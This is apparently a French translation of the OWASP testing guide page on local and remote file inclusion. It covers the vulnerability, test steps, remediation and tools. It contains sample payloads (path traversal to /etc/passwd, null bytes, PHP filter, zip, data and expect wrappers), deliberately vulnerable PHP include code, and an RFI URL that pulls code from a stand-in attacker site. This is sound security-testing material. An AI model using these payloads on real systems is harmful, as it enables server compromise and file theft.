# Test d'inclusion de fichier

## Sommaire

La vulnérabilité File Inclusion permet à un attaquant d'inclure un fichier, en exploitant généralement un mécanisme "d'inclusion dynamique de fichiers" implémenté dans l'application cible. La vulnérabilité se produit en raison de l'utilisation d'entrées fournies par l'utilisateur sans validation appropriée.

Cela peut conduire à quelque chose d'aussi simple que de sortir le contenu du fichier, mais cela peut aussi conduire à :

- Exécution de code sur le serveur web
- Exécution de code côté client tel que JavaScript qui peut conduire à d'autres attaques telles que le cross site scripting (XSS)
- Déni de service (DoS)
- Divulgation d'informations sensibles

L'inclusion de fichiers locaux (LFI) est le processus d'inclusion de fichiers déjà présents sur le serveur grâce à l'exploitation de procédures d'inclusion vulnérables mises en œuvre dans l'application. Par exemple, cette vulnérabilité se produit lorsqu'une page reçoit une entrée qui est un chemin vers un fichier local. Cette entrée n'est pas correctement filtrée, ce qui permet d'injecter des caractères de traversée de répertoire (tels que `../` -- voir 4.5.1 [Testing Directory Traversal File Include](../05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md)) .

L'inclusion de fichiers à distance (RFI) est le processus d'inclusion de fichiers provenant de sources distantes grâce à l'exploitation de procédures d'inclusion vulnérables mises en œuvre dans l'application. Par exemple, cette vulnérabilité se produit lorsqu'une page reçoit une entrée qui est l'URL d'un fichier distant. Cette entrée n'est pas correctement filtrée, ce qui permet d'injecter des URL externes.

Dans les deux cas, bien que la plupart des exemples indiquent des scripts PHP vulnérables, nous devons garder à l'esprit que cela est également courant dans d'autres technologies telles que JSP, ASP, etc.

## Objectifs des tests

- Identifier les points d'inclusion de fichiers.
- Évaluer la gravité ou l'impact potentiel des vulnérabilités.

## Comment tester

### Test d'inclusion de fichiers locaux

Étant donné que LFI se produit lorsque les chemins transmis aux instructions `include` ne sont pas correctement filtrés, dans une approche de test de boîte noire, nous devrions rechercher une fonctionnalité qui accepte les noms de fichiers/chemins comme paramètres.

Considérez l'exemple suivant :

`http://vulnerable_host/preview.php?file=example.html`

Cela semble être un endroit prometteur pour essayer LFI. Si l'application ne sélectionne pas la page appropriée indiquée dans le paramètre `file` et inclut directement l'entrée, il est possible d'inclure des fichiers arbitraires du serveur.

Un exploit de preuve de concept typique consisterait à tenter de charger le fichier `passwd` avec :

`http://vulnerable_host/preview.php?file=../../../../etc/passwd`

Si les conditions mentionnées ci-dessus sont remplies, un attaquant verra quelque chose comme ce qui suit inclus dans la réponse :

```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...
```

Même lorsqu'une telle vulnérabilité existe, son exploitation pourrait être plus complexe dans des scénarios réels. Considérez le morceau de code suivant :

```php
<?php include($_GET['file'].".php"); ?>
```

Une simple substitution avec un nom de fichier aléatoire ne fonctionnerait pas car le suffixe `.php` est ajouté à l'entrée fournie. Afin de le contourner, un testeur peut utiliser plusieurs techniques pour obtenir l'exploitation attendue.

#### Injection d'octets nuls

Le `caractère nul` (également connu sous le nom de `terminateur nul` ou `octet nul`) est un caractère de contrôle avec la valeur zéro présent dans de nombreux jeux de caractères qui est utilisé comme caractère réservé pour marquer la fin d'une chaîne. Une fois utilisé, tout caractère après cet octet spécial sera ignoré. Généralement, la façon d'injecter ce caractère serait avec la chaîne encodée URL `% 00` en l'ajoutant au chemin demandé. Dans notre exemple précédent, effectuer une requête à `http://vulnerable_host/preview.php?file=../../../../etc/passwd%00` ignorerait l'extension `.php` ajoutée au nom du fichier d'entrée, renvoyant à un attaquant une liste d'utilisateurs de base à la suite d'une exploitation réussie.

#### Troncation des chemins et des points

La plupart des installations PHP ont une limite de nom de fichier de 4096 octets. Si un nom de fichier donné est plus long que cette longueur, PHP le tronque simplement, supprimant tout caractère supplémentaire. Abuser de ce comportement permet de faire en sorte que le moteur PHP ignore l'extension `.php` en la déplaçant hors de la limite de 4096 octets. Lorsque cela se produit, aucune erreur n'est déclenchée ; les caractères supplémentaires sont simplement supprimés et PHP continue son exécution normalement.

Ce contournement serait généralement combiné avec d'autres stratégies de contournement logique telles que l'encodage d'une partie du chemin du fichier avec l'encodage Unicode, l'introduction d'un double encodage ou toute autre entrée qui représenterait toujours le nom de fichier souhaité valide.

#### Emballages PHP

Les vulnérabilités d'inclusion de fichiers locaux sont généralement considérées comme des vulnérabilités en lecture seule qu'un attaquant peut utiliser pour lire des données sensibles à partir du serveur hébergeant l'application vulnérable. Cependant, dans certaines implémentations spécifiques, cette vulnérabilité peut être utilisée pour mettre à niveau l'attaque [de LFI vers l'exécution de code à distance](https://www.corben.io/zip-to-rce-lfi/) vulnérabilités qui pourraient potentiellement compromettre complètement le héberger.

Cette amélioration est courante lorsqu'un attaquant pourrait combiner la [vulnérabilité LFI avec certains wrappers PHP](https://www.netsparker.com/blog/web-security/php-stream-wrappers/).

Un wrapper est un code qui entoure un autre code pour exécuter certaines fonctionnalités supplémentaires. PHP implémente de nombreux [wrappers intégrés](https://www.php.net/manual/en/wrappers.php) à utiliser avec les fonctions du système de fichiers. Une fois leur utilisation détectée lors du processus de test d'une application, il est de bon ton d'essayer d'en abuser pour identifier le risque réel de la ou des faiblesses détectées. Vous trouverez ci-dessous une liste des wrappers les plus couramment utilisés, même si vous devez considérer qu'elle n'est pas exhaustive et qu'il est en même temps possible d'enregistrer des wrappers personnalisés qui, s'ils étaient utilisés par la cible, nécessiteraient une analyse ad hoc plus approfondie.

##### Filtre PHP

Utilisé pour accéder au système de fichiers local ; il s'agit d'un wrapper insensible à la casse qui permet d'appliquer des filtres à un flux au moment de l'ouverture d'un fichier. Ce wrapper peut être utilisé pour récupérer le contenu d'un fichier empêchant le serveur de l'exécuter. Par exemple, permettre à un attaquant de lire le contenu de fichiers PHP pour obtenir le code source afin d'identifier des informations sensibles telles que des informations d'identification ou d'autres vulnérabilités exploitables.

Le wrapper peut être utilisé comme `php://filter/convert.base64-encode/resource=FILE` où `FILE` est le fichier à récupérer. À la suite de l'utilisation de cette exécution, le contenu du fichier cible serait lu, encodé en base64 (c'est l'étape qui empêche l'exécution côté serveur) et renvoyé au User-Agent.

##### ZIP PHP

Dans PHP 7.2.0, le wrapper `zip://` a été introduit pour manipuler les fichiers compressés `zip`. Ce wrapper attend la structure de paramètre suivante : `zip:///filename_path#internal_filename`. Le `filename_path` est le chemin vers l'archive zip malveillante et `internal_filename` est le chemin du fichier malveillant placé à l'intérieur du fichier ZIP traité. Lors de l'exploitation, il est courant que le `#` soit encodé avec sa valeur d'URL encodée `%23`.

L'abus de ce wrapper pourrait permettre à un attaquant de concevoir un fichier ZIP malveillant qui pourrait être téléchargé sur le serveur, par exemple en tant qu'image d'avatar ou en utilisant n'importe quel système de téléchargement de fichiers disponible sur le site Web cible (le wrapper `php:zip://` ne nécessite pas que le fichier zip ait une extension spécifique) pour être exécuté par la vulnérabilité LFI.

Afin de tester cette vulnérabilité, la procédure suivante peut être suivie pour attaquer l'exemple de code précédent fourni.

1. Créez le fichier PHP à exécuter, par exemple avec le contenu `<?php phpinfo(); ?>` et enregistrez-le sous `code.php`.
2. Compressez-le dans un nouveau fichier ZIP appelé `target.zip`.
3. Renommez le fichier `target.zip` en `target.jpg` pour contourner la validation de l'extension et téléchargez-le sur le site Web cible en tant qu'image de votre avatar.
4. En supposant que le fichier `target.jpg` est stocké localement sur le serveur dans le chemin `../avatar/target.jpg`, exploitez la vulnérabilité avec le wrapper PHP ZIP en injectant la charge utile suivante dans l'URL vulnérable : ` zip://../avatar/target.jpg%23code` (rappelez-vous que `%23` correspond à `#`).

Étant donné que sur notre exemple, l'extension `.php` est concaténée à notre charge utile, la requête à `http://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code` entraînera l'exécution du fichier `code.php` existant dans le fichier ZIP illicite.

##### Données PHP

Disponible depuis PHP 5.2.0, ce wrapper attend l'utilisation suivante : `data://text/plain;base64,BASE64_STR` où `BASE64_STR` est censé être le contenu encodé en Base64 du fichier à traiter. Il est important de considérer que ce wrapper ne serait disponible que si l'option `allow_url_include` était activée.

Afin de tester LFI à l'aide de ce wrapper, le code à exécuter doit être encodé en Base64. Par exemple, `<?php phpinfo(); ?>` serait encodé comme : `PD9waHAgcGhwaW5mbygpOyA/Pg==` et la charge utile serait représentée comme : `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`.

##### Attendre PHP

Ce wrapper, qui n'est pas activé par défaut, donne accès aux processus `stdio`, `stdout` et `stderr`. Donné au format `expect://command`, le serveur exécuterait la commande fournie en utilisant `BASH` et renverrait le résultat.

### Test d'inclusion de fichiers distants

Étant donné que RFI se produit lorsque les URL transmises aux instructions `include` ne sont pas correctement filtrées, dans une approche de test de boîte noire, nous devrions rechercher des scripts qui prennent les noms de fichiers comme paramètres. Prenons l'exemple PHP suivant :

```php
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

Dans cet exemple, le chemin est extrait de la requête HTTP et aucune validation d'entrée n'est effectuée (par exemple, en vérifiant l'entrée par rapport à une liste d'autorisations), donc cet extrait de code est vulnérable à ce type d'attaque. Considérez l'URL suivante :

`http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page`

Dans ce cas, le fichier distant sera inclus et tout code qu'il contient sera exécuté par le serveur.

## Correction

La solution la plus efficace pour éliminer les vulnérabilités d'inclusion de fichiers consiste à éviter de transmettre les entrées soumises par l'utilisateur à une API de système de fichiers/framework. Si cela n'est pas possible, l'application peut maintenir une liste d'autorisation de fichiers qui peuvent être inclus par la page, puis utiliser un identifiant (par exemple, le numéro d'index) pour accéder au fichier sélectionné. Toute demande contenant un identifiant non valide doit être rejetée afin qu'il n'y ait aucune possibilité pour des utilisateurs malveillants de manipuler le chemin.
Consultez la [fiche de triche pour le téléchargement de fichiers](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) pour connaître les bonnes pratiques de sécurité à ce sujet.

## Outils

- [kadimus](https://github.com/P0cL4bs/Kadimus)
- [Suite LFI] (https://github.com/D35m0nd142/LFISuite)
- [Proxy d'attaque Zed OWASP (ZAP)] (https://www.zaproxy.org)

## Références

- [Wikipédia](https://www.wikipedia.org/wiki/Local_File_Inclusion)
- [Caractère nul](https://en.wikipedia.org/wiki/Null_character)
- [Codage Unicode](https://owasp.org/www-community/attacks/Unicode_Encoding)
- [Double Encodage](https://owasp.org/www-community/Double_Encoding)
- [Protocoles et wrappers pris en charge par PHP] (https://www.php.net/manual/en/wrappers.php)
- [RFC 2397 - Le schéma d'URL "données"] (http://www.faqs.org/rfcs/rfc2397.html)
- ["Inclusion de fichiers à distance"](http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion)
- [Wikipédia : "Inclusion de fichiers à distance"](https://en.wikipedia.org/wiki/Remote_File_Inclusion)
